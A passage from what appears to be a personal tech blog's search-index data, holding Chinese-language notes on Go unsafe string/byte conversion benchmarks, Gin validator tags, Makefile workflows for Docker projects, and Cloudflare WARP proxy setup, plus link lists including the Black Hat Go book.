v.CanSet()) // 47, false // v.Set(reflect.ValueOf(50)) flagField := reflect.ValueOf(\u0026amp;v).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) // 修改 flag 字段的值 *flagPtr |= uintptr(flagAddr) // 设置可寻址标志位 fmt.Printf(\u0026#34;CanSet: %v\\n\u0026#34;, v.CanSet()) // true v.SetInt(50) fmt.Printf(\u0026#34;修改后的值：%d\\n\u0026#34;, v.Int()) // 50 } 四种字符串和 bytes 互相转换方式的性能比较 三、新型 unsafe 方式 func toBytes(s string) []byte { if len(s) == 0 { return nil } return unsafe.Slice(unsafe.StringData(s), len(s)) } func toString(b []byte) string { if len(b) == 0 { return \u0026#34;\u0026#34; } return unsafe.String(unsafe.SliceData(b), len(b)) } 四、kubernetes 的实现 func toK8sBytes(s string) []byte { return *(*[]byte)(unsafe.Pointer(\u0026amp;s)) } func toK8sString(b []byte) string { return *(*string)(unsafe.Pointer(\u0026amp;b)) } 在 Mac mini M2 上运行，go1.22.6 darwin/arm64，结果如下： goos: darwin goarch: arm64 pkg: github.com/smallnest/study/str2bytes BenchmarkStringToBytes/强制转换-8 78813638\t14.73 ns/op\t16 B/op\t1 allocs/op BenchmarkStringToBytes/传统转换-8 599346962\t2.010 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/新型转换-8 624976126\t1.929 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/k8s转换-8 887370499\t1.211 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/强制转换-8 92011309\t12.68 ns/op\t16 B/op\t1 allocs/op BenchmarkBytesToString/传统转换-8 815922964\t1.471 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/新型转换-8 624965414\t1.922 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/k8s转换-8 1000000000\t1.194 ns/op\t0 B/op\t0 allocs/op string 转 bytes 性能最好的是 k8s 方案，新型转换和传统转换性能差不多，新型方案略好，强制转换性能最差。\n而对于 bytes 转 string，k8s 方案性能最好，传统转换次之，新型转换性能再次之，强制转换性能非常不好。\n在 Linux amd64 上运行，go1.22.0 linux/amd64，结果如下： goos: linux goarch: amd64 pkg: test cpu: Intel(R) Xeon(R) Platinum BenchmarkStringToBytes/强制转换-2 30606319\t42.02 ns/op\t16 B/op\t1 allocs/op BenchmarkStringToBytes/传统转换-2 315913948\t3.779 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/新型转换-2 411972518\t2.753 ns/op\t0 B/op\t0 allocs/op BenchmarkStringToBytes/k8s转换-2 449640819\t2.770 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/强制转换-2 38716465\t29.18 ns/op\t16 B/op\t1 allocs/op BenchmarkBytesToString/传统转换-2 458832459\t2.593 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/新型转换-2 439537762\t2.762 ns/op\t0 B/op\t0 allocs/op BenchmarkBytesToString/k8s转换-2 478885546\t2.375 ns/op\t0 B/op\t0 allocs/op 整体上看，k8s 方案、传统转换、新型转换性能都挺好，强制转换性能最差。k8s 在 bytes 转 string 上性能最好。\n","date":"August 20, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240820-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://juejin.cn/post/6863765115456454664\" target=\"_blank\" rel=\"noopener\"\u003e学会 gin 参数校验之 validator 库，看这一篇就足够了\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"字符串约束\"\u003e字符串约束\u003c/h3\u003e\n\u003cp\u003eexcludesall：不包含参数中任意的 UNICODE 字符，例如 excludesall=ab\u003c/p\u003e\n\u003cp\u003eexcludesrune：不包含参数表示的 rune 字符，excludesrune=asong\u003c/p\u003e\n\u003cp\u003estartswith：以参数子串为前缀，例如 startswith=hi\u003c/p\u003e\n\u003cp\u003eendswith：以参数子串为后缀，例如 endswith=bye。\u003c/p\u003e\n\u003cp\u003econtains=：包含参数子串，例如 contains=email\u003c/p\u003e\n\u003cp\u003econtainsany：包含参数中任意的 UNICODE 字符，例如 containsany=ab\u003c/p\u003e\n\u003cp\u003econtainsrune：包含参数表示的 rune 字符，例如`containsrune=asong\u003c/p\u003e\n\u003cp\u003eexcludes：不包含参数子串，例如 excludes=email\u003c/p\u003e\n\u003ch3 id=\"范围约束\"\u003e范围约束\u003c/h3\u003e\n\u003cp\u003e范围约束的字段类型分为三种：\u003c/p\u003e\n\u003cp\u003e对于数值，我们则可以约束其值\n对于切片、数组和 map，我们则可以约束其长度\n对于字符串，我们则可以约束其长度\u003c/p\u003e\n\u003ch4 id=\"常用-tag-介绍\"\u003e常用 tag 介绍：\u003c/h4\u003e\n\u003cp\u003ene：不等于参数值，例如 ne=5\ngt：大于参数值，例如 gt=5\ngte：大于等于参数值，例如 gte=50\nlt：小于参数值，例如 lt=50\nlte：小于等于参数值，例如 lte=50\noneof：只能是列举出的值其中一个，这些值必须是数值或字符串，以空格分隔，如果字符串中有空格，将字符串用单引号包围，例如 oneof=male female。\neq：等于参数值，注意与 len 不同。对于字符串，eq 约束字符串本身的值，而 len 约束字符串长度。例如 eq=10\nlen：等于参数值，例如 len=10\nmax：小于等于参数值，例如 max=10\nmin：大于等于参数值，例如 min=10\u003c/p\u003e\n\u003ch3 id=\"fields-约束\"\u003eFields 约束\u003c/h3\u003e\n\u003cp\u003eeqfield：定义字段间的相等约束，用于约束同一结构体中的字段。例如：eqfield=Password\neqcsfield：约束统一结构体中字段等于另一个字段（相对），确认密码时可以使用，例如：eqfiel=ConfirmPassword\nnefield：用来约束两个字段是否相同，确认两种颜色是否一致时可以使用，例如：nefield=Color1\nnecsfield：约束两个字段是否相同（相对）\u003c/p\u003e\n\u003ch3 id=\"常用约束\"\u003e常用约束\u003c/h3\u003e\n\u003cp\u003eunique：指定唯一性约束，不同类型处理不同：\u003c/p\u003e","tags":["golang","URL","GIN","byte","string"],"title":"Go articles"},{"categories":["URL","Docker","Traefik","MinIO"],"contents":" Docker 环境下使用 Traefik v3 和 MinIO 快速搭建私有化对象存储服务 https://github.com/soulteary/traefik-minio-example.git Docker 环境下使用 Traefik 3 的最佳实践：快速上手 ","date":"August 6, 2024","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240806-best-practices-for-traefik-3-and-minio-in-docker-getting-started-quickly/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://soulteary.com/2024/08/05/best-practices-for-traefik-3-and-minio-in-docker-getting-started-quickly.html\" target=\"_blank\" rel=\"noopener\"\u003eDocker 环境下使用 Traefik v3 和 MinIO 快速搭建私有化对象存储服务\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/soulteary/traefik-minio-example.git\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/soulteary/traefik-minio-example.git\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://soulteary.com/2024/08/04/best-practices-for-traefik-3-in-docker-getting-started-quickly.html#docker-%E7%8E%AF%E5%A2%83\" target=\"_blank\" rel=\"noopener\"\u003eDocker 环境下使用 Traefik 3 的最佳实践：快速上手\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Docker","Traefik","MinIO"],"title":"Docker 环境下使用 Traefik v3 和 MinIO 快速搭建私有化对象存储服务"},{"categories":["URL","BASH","SHELL"],"contents":" 寫 Web 也可以用 Makefile：好好管理你的環境流程 How I stopped worrying and loved Makefiles 注意：Makefile 的縮排應使用 Tab，否則會出現語法問題。\nMakefile 的主要本體：Target up: cp .env.example .env docker compose up -d workspace stop: docker compose stop zsh: docker compose exec workspace zsh 本例有三個 Target：up、stop、zsh。Makefile 預設將第一個 Target 視為 Goal(不能是點（dot）開頭的 Target)，是專案的最主要流程，可以直接用 make 執行。以本例來說，執行 make 和 make up 是一樣的結果。 但其實剛剛複製檔案的例子不是常見的 Make 用法。Make 的強項是在自動判斷有沒有必要執行每個 Target 的流程。例如我們常常將機敏資料放在 .env 中，若 .env 已經存在，就不應該再複製 .env.example 覆寫過去了。這時候我們可以把 .env 做成一個 Target： up: .env docker compose up -d workspace .env: cp .env.example .env Target 名稱預設是被視為檔名的。Make 之所以稱為 make，就是想要「製作」出指定的 Target，當符合指定條件時（如檔案不存在）才會執行 Target 的內容。 以本例來說，我們執行 up Target 時，如果 .env 不存在，就會先執行 .env Target 以複製出 .env，接著才會啟動 workspace container。如果執行 up Target 時 .env 已經存在，就會略過 .env Target，直接啟動 workspace container。 同樣地，如果我們目錄中有「up」這個檔案， up Target 就不會被執行了。這時我們可以設定 Phony Target，告訴 Make 哪些 Target 不是檔案的名稱，而是單純流程的命名。寫法如下： .PHONY: up stop zsh 來點變數 Make 當然也支援變數（Variable），與常見的 Unix 環境變數慣例相同，我們習慣用 SCREAMING_SNAKE_CASE 表示法（全大寫和底線的表示法）。並且在使用時以 $() 包裹變數名稱。\n例如我們想要方便啟動指定的 container，可以將 up 改寫成：\nCONTAINERS ?= workspace mysql up: docker compose up -d $(CONTAINERS) .PHONY: up 這裡我們設定了一個變數 CONTAINERS，當我們未指定時，預設值為 「workspace mysql」。例如我們呼叫 make up 時會執行以下指令：\ndocker compose up -d workspace mysql 當我們想要給予該變數一個值，例如我們想用 up Target 開啟 redis container，可以這樣呼叫：\nmake up CONTAINERS=\u0026#34;redis\u0026#34; 這時 Make 就會幫我們執行以下指令：\ndocker compose up -d redis 另一種常見的用法是透過變數指定 Docker Compose 的參數，如以下範例：\nCONTAINER_USER ?= default CONTAINERS ?= workspace zsh: docker compose exec --user=$(CONTAINER_USER) $(CONTAINERS) zsh .PHONY: zsh 這裡預設是以「default」來進入 container。這時我們可以透過指定 CONTAINER_USER 來更改執行指令的使用者，以指定成「root」為例：\nmake zsh CONTAINER_USER=\u0026#34;root\u0026#34; 這時 Make 就會幫我們執行以下指令，以「root」進入 container：\ndocker compose exec --user=root workspace zsh 做一些條件判斷 想要有一些稍微複雜的邏輯判斷？Make 也支援條件式（Conditional），最常見的是 ifeq 和 ifneq，分別對應「如果等於」和「如果不等於」，以下是範例：\nIS_ROOT ?= false zsh: ifeq ($(IS_ROOT), true) docker compose exec --user=root workspace zsh else docker compose exec workspace zsh endif .PHONY: zsh 以此例來說，當我們執行 make zsh 時，Make 會判斷 $(IS_ROOT) 是否等於 \u0026ldquo;true\u0026rdquo;，若相等的話，就會以 root 的身份進入 workspace container，否則就改以預設的 user 進入。\n首先要注意的是，只有被執行的指令部分需要 Tab 縮排，條件式相關的語句應該要保持不縮排，因為他是屬於 Make 語法的一部分。另外提醒，雖然本例中使用的是 true/false，但其實 Make 是沒有布林值型態的，在這裡是比對字串有無相等。\n控制字串的輸出 接著我們來加一些輸出，讓我們能更容易辨識流程。以下是 Make 標準輸出的 Control Function，稱之為 info：\nIS_ROOT ?= false zsh: ifeq ($(IS_ROOT), true) $(info 以 Root 身份進入 workspace) docker compose exec --user=root workspace zsh else $(info 以預設身份進入 workspace) docker compose exec workspace zsh endif .PHONY: zsh 此時若我們執行 make zsh，看到的輸出如下：\n以預設身份進入 workspace docker compose exec workspace zsh # 接者是 Docker Compose 執行結果 如此透過 Control Function 我們就能更客製化顯示的內容，另外還有 warning 和 error 兩種輸出，可以參考說明文件。\n另外，有時不想要我們的指令干擾畫面的呈現，這時候我們可以在行首加上 @ 符號，阻止 Make Echoing。以文章開始的 Hello World 範例改寫如下：\nhello: @echo \u0026#34;Hello World\u0026#34; .PHONY: hello 這時當我們執行 make hello，呈現的結果如下：\nHello World 就不會出現 echo \u0026quot;Hello World\u0026quot; 字樣了。\n組合技：管理不同環境的流程 讀到這裡，我們已經掌握了 Make 的基本用法。接者我們來討論看看該怎麼管理不同環境的流程。\n假設我們分成「開發環境（dev）」與「正式環境（production）」，啟動專案的流程如下：\n兩者環境啟動前都需要 .env 檔，若檔案不存在，dev 環境從 .env.example 複製建立，production 環境從 .env.example.production 複製建立 兩者環境都需要啟動 workspace container，dev 環境還要額外啟用 redis container 啟動時呈現當前環境名稱 啟動流程不顯示指令，但以中文描述動作 以下為其中一種 Makefile 寫法：\nENVIRONMENT ?= dev up: .env $(info 目前環境為 $(ENVIRONMENT)) $(info 啟動 workspace) docker compose up -d workspace ifeq ($(ENVIRONMENT), dev) $(info 啟動 redis) docker compose up -d redis endif .PHONY: up .env: $(info .env 不存在，建立 .env 檔) ifeq ($(ENVIRONMENT), dev) cp .env.example .env else cp .env.example.production .env endif 到這裡，我們已經可以開始撰寫針對不同環境的流程了！我們還可以加上一些 Phony Target 來整理常用的指令，例如前面範例提過的 stop 和 zsh，或是執行 Laravel 測試：\ntest: docker compose exec workspace php artisan test .PHONE: test 註解的使用 跟 Shell Script 一樣使用 #。\n值得注意的是，如果在 Target 中使用 Tab 縮排後的 # ，會被視為是 Shell Script 的註解。\n取得當前 Target 名 使用 $@。\nup: $(info 目前執行的 Target 是 $@) # 顯示 up docker compose up -d $(CONTAINERS) .PHONY: up Make 變數與 Shell Script 變數混用 也許你在流程中想使用 Shell Script 變數，如果要使用 $ 在指令中，跳脫的方法不是 \\$，而是 $$。\n變數內容可以為 Shell 執行結果 請看範例：\nMY_IP = $(shell curl -s ipinfo.io/ip) get-ip: $(info 我的 IP：$(MY_IP)) .PHONY: get-ip 變數可以擴充 透過 += 和 ifeq 可以更簡單的管理環境，請看範例：\nENVIRONMENT ?= dev CONTAINERS ?= workspace ifeq ($(ENVIRONMENT), dev) # 強制 dev 環境會開啟 redis CONTAINERS += redis endif up: $(info 目前環境為 $(ENVIRONMENT)) $(info 啟動 $(CONTAINERS)) # dev 環境預設會開啟 workspace 和 redis docker compose up -d $(CONTAINERS) .PHONY: up 想要抽成 function？ 如果有一直重複的指令前綴可以抽成變數，參數也可以抽成另一個變數方便執行時替換：\nCOMPOSE_FLAGS ?= -d EXEC_CONTAINER ?= workspace EXEC ?= docker compose exec $(COMPOSE_FLAGS) $(EXEC_CONTAINER) zsh: $(EXEC) zsh .PHONY: zsh bash: $(EXEC) bash .PHONY: bash 我們也許可以這樣執行：\nmake zsh COMPOSE_FLAGS=\u0026#34;-d -T\u0026#34; 當然 flags 也可以用前面提到的 += 概念去組合。\n除了一般變數的用法外，還有多行變數（define）搭配 Call Function $(call [variable]) 的用法。\n剛提到了 info、shell 和 call，還有沒有其他神奇 Function 還蠻多的，例如 filter、subst、realpath⋯⋯。想看各種 Function 的介紹請參考 Function 說明文件。\n另外，所有 Make 內建的 Function、變數、指令可以 在此查表。\n如果想要中間才執行 Prerequisite？ 可以使用 Double-Colon Rules 語法，主要是把 : 改成 ::，將 Target 拆開成兩部分，例如：\nup:: $(info 我先顯示這句後才想製作 .env) up:: .env $(info 製作 .env 後才啟動 workspace) docker compose up -d workspace .PHONY: up .env: cp .env.example .env 更多 Prerequisite 用法 可以使用變數決定 Prerequisite，Target 也可以是路徑：\nPREREQUISITE ?= .env ../laravel/.env up: $(PREREQUISITE) docker compose up -d workspace .PHONY: up .env: # Docker 的 .env cp .env.example .env ../laravel/.env: # 隔壁目錄的 .env cp ../laravel/.env.example ../laravel/.env 進階變數使用 變數宣告另外還有 =、:= 等用法。\n另外 Target 是可以給定值的，要附在 Target 前（請見範例）。但這種寫法我覺得維護上有很多問題，我都盡量避免使用。\nMakefile 範例一：\nTEXT ?= default hello: hey $(info hello: $(TEXT)) .PHONY: hello hey: TEXT ?= hey hey: $(info hey: $(TEXT)) .PHONY: hey Makefile 範例一執行結果，hey 認為 TEXT 已經給過值，就不會套用 hey 值：\n# 執行 make hey: default hello: default # 執行 make TEXT=Jack hey: Jack hello: Jack Makefile 範例二，將 hey 給值由 ?= 改為 =：\nTEXT ?= default hello: hey $(info hello: $(TEXT)) .PHONY: hello hey: TEXT = hey hey: $(info hey: $(TEXT)) .PHONY: hey Makefile 範例二執行結果，此時 hello 不受影響：\n# 執行 make hey: hey hello: default 若在流程中改值， = 的用法是會先展開取得最終結果，才確定整個流程的變數內容是什麼，從頭到尾值都會保持一致，請見範例三。\nMakefile 範例三，改成 hello 給值：\nTEXT ?= default hello: TEXT = hello hello: hey $(info hello: $(TEXT)) .PHONY: hello hey: $(info hey: $(TEXT)) .PHONY: hey Makefile 範例三執行結果，因為是 =，即使 hello 執行順序比較後面，依然影響到前面的 hey 取值：\n# 執行 make hey: hello hello: hello Makefile 也有個 官方範例 說明 = 展開的概念：\nfoo = $(bar) bar = $(ugh) ugh = Huh? all: @echo $(foo) # 輸出結果為 Huh? := 的用法與一般程式語言的等號賦值比較類似。讓我們修改一下剛剛的官方範例，將 = 改成 :=：\nfoo := $(bar) bar := $(ugh) ugh := Huh? all: @echo $(foo) # 輸出結果為空白行 ","date":"August 5, 2024","hero":"/images/hero/shell.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240805-use-makefile-to-manage-workflows-for-web-projects/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.goodjack.tw/2023/01/use-makefile-to-manage-workflows-for-web-projects.html\" target=\"_blank\" rel=\"noopener\"\u003e寫 Web 也可以用 Makefile：好好管理你的環境流程\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gagor.pro/2024/02/how-i-stopped-worrying-and-loved-makefiles/\" target=\"_blank\" rel=\"noopener\"\u003eHow I stopped worrying and loved Makefiles\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e注意：Makefile 的縮排應使用 Tab，否則會出現語法問題。\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 id=\"makefile-的主要本體target\"\u003eMakefile 的主要本體：Target\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-makefile\" data-lang=\"makefile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tcp .env.example .env\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdocker compose up -d workspace\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003estop\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdocker compose stop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ezsh\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdocker compose exec workspace zsh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e本例有三個 Target：\u003ccode\u003eup\u003c/code\u003e、\u003ccode\u003estop\u003c/code\u003e、\u003ccode\u003ezsh\u003c/code\u003e。Makefile 預設將第一個 Target 視為 \u003ca href=\"https://www.gnu.org/software/make/manual/html_node/Goals.html\" target=\"_blank\" rel=\"noopener\"\u003eGoal\u003c/a\u003e(不能是點（dot）開頭的 Target)，是專案的最主要流程，可以直接用 \u003ccode\u003emake\u003c/code\u003e 執行。以本例來說，執行 \u003ccode\u003emake\u003c/code\u003e 和 \u003ccode\u003emake up\u003c/code\u003e 是一樣的結果。\u003c/li\u003e\n\u003cli\u003e但其實剛剛複製檔案的例子不是常見的 Make 用法。Make 的強項是在自動判斷有沒有必要執行每個 Target 的流程。例如我們常常將機敏資料放在 .env 中，若 .env 已經存在，就不應該再複製 .env.example 覆寫過去了。這時候我們可以把 .env 做成一個 Target：\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-makefile\" data-lang=\"makefile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eup\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e .env\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tdocker compose up -d workspace\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e.env\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tcp .env.example .env\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eTarget 名稱預設是被視為檔名的。Make 之所以稱為 make，就是想要「製作」出指定的 Target，當符合指定條件時（如檔案不存在）才會執行 Target 的內容。\n\u003cul\u003e\n\u003cli\u003e以本例來說，我們執行 \u003ccode\u003eup\u003c/code\u003e Target 時，如果 .env 不存在，就會先執行 \u003ccode\u003e.env\u003c/code\u003e Target 以複製出 .env，接著才會啟動 workspace container。如果執行 \u003ccode\u003eup\u003c/code\u003e Target 時 .env 已經存在，就會略過 \u003ccode\u003e.env\u003c/code\u003e Target，直接啟動 workspace container。\u003c/li\u003e\n\u003cli\u003e同樣地，如果我們目錄中有「up」這個檔案， \u003ccode\u003eup\u003c/code\u003e Target 就不會被執行了。這時我們可以設定 \u003ca href=\"https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html\" target=\"_blank\" rel=\"noopener\"\u003ePhony Target\u003c/a\u003e，告訴 Make 哪些 Target 不是檔案的名稱，而是單純流程的命名。寫法如下：\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-makefile\" data-lang=\"makefile\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e.PHONY\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e up stop zsh\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"來點變數\"\u003e來點變數\u003c/h2\u003e\n\u003cp\u003eMake 當然也支援變數（\u003ca href=\"https://www.gnu.org/software/make/manual/html_node/Setting.html\" target=\"_blank\" rel=\"noopener\"\u003eVariable\u003c/a\u003e），與常見的 Unix 環境變數慣例相同，我們習慣用 SCREAMING_SNAKE_CASE 表示法（全大寫和底線的表示法）。並且在使用時以 \u003ccode\u003e$()\u003c/code\u003e 包裹變數名稱。\u003c/p\u003e","tags":["URL","BASH","SHELL"],"title":"寫 Web 也可以用 Makefile：好好管理你的環境流程"},{"categories":["URL","Go"],"contents":" https://nostarch.com/blackhatgo https://github.com/blackhat-go/bhg https://github.com/TralahM/blackhat-go 黑帽 Go https://github.com/YYRise/bhg ","date":"August 1, 2024","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240801-black-hat-go/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://nostarch.com/blackhatgo\" target=\"_blank\" rel=\"noopener\"\u003ehttps://nostarch.com/blackhatgo\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/blackhat-go/bhg\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/blackhat-go/bhg\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/TralahM/blackhat-go\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/TralahM/blackhat-go\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.yuque.com/yyrise/black-hat-go\" target=\"_blank\" rel=\"noopener\"\u003e黑帽 Go\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/YYRise/bhg\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/YYRise/bhg\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go"],"title":"黑帽Go"},{"categories":["URL","Cloudflare"],"contents":" 隐藏于 Cloudflare 的全球网络之中 一种方式是走 Cloudflare WARP，WARP 可以运行在 proxy mode 而不是接管全局流量 warp-cli register # warp 监听本地的11111端口 warp-cli set-proxy-port 11111 # warp proxy mode warp-cli set-mode proxy # 永久开启 warp-cli enable-always-on https_proxy=socks5://127.0.0.1:11111 http_proxy=socks5://127.0.0.1:11111 go run main.go 还有一种方式是使用 Cloudflare Workers，请求由 Workers 转发 export default { async fetch(request: Request): Promise { /** * Replace `remote` with the host you wish to send requests to */ const remote = \u0026#34;https://example.com\u0026#34;; return await fetch(remote, request); }, }; ","date":"August 1, 2024","hero":"/images/hero/cloudflare.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240801-hide-in-cf/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dmesg.app/hide-in-cf.html\" target=\"_blank\" rel=\"noopener\"\u003e隐藏于 Cloudflare 的全球网络之中\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e一种方式是走 Cloudflare WARP，WARP 可以运行在 proxy mode 而不是接管全局流量\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli register\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# warp 监听本地的11111端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli set-proxy-port \u003cspan style=\"color:#ae81ff\"\u003e11111\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# warp proxy mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli set-mode proxy\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 永久开启\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ewarp-cli enable-always-on\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehttps_proxy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esocks5://127.0.0.1:11111 http_proxy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esocks5://127.0.0.1:11111 go run main.go\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"2\"\u003e\n\u003cli\u003e还有一种方式是使用 Cloudflare Workers，请求由 Workers 转发\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eexport\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003edefault\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003easync\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efetch\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003erequest\u003c/span\u003e\u003cspan 